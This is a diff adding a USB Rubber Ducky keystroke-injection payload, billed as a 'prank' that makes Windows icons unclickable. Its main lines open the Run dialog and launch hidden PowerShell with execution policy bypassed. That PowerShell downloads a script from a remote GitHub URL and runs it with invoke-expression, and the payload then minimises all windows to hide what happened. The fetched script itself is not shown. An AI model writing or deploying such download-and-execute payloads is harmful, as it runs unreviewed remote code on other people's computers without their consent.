@@ -1,1 +1,21 @@
+REM     Title: UnclickableIcons
 
+REM     Author: gavhu10
+
+REM     Description: The famous computer prank that makes all your icons not work!
+
+REM     Target: Windows 10, 11
+
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+REM Using I am Jackoby's method of launching a powershell script:
+
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/gavhu10/usbrubberducky-payloads/refs/heads/master/payloads/library/prank/Unclickable-Icons/payload.ps1?dl=1; invoke-expression $pl
+ENTER
+
+REM Minimise all windows
+GUI d
